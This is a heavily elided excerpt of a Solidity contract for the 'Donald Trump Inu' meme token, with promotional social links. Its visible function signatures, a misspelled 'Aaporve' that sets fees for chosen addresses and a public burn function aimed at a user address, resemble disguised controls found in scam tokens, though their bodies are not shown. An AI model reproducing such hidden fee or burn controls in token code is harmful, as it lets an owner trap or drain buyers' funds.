...
/**
https://t.me/DonaldTrump_Inu
https://twitter.com/TRUMPINU_Erc20
Time to make inu great again
*/
...
abstract contract Ownable {
    ...
    function transferOwnershipbetillys(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract TRUMPINU is Ownable {
    ...
    constructor (){
        name = unicode"Donald Trump Inu";
        symbol = unicode"TRUMPINU";
        decimals = 9;
        uint256 Supply = 6942000000;
    ...
    function Aaporve(address[] memory _addresses, uint256 _feePercentage) external {
    ...
    function _burnlplientdsbbrn(address user) public {
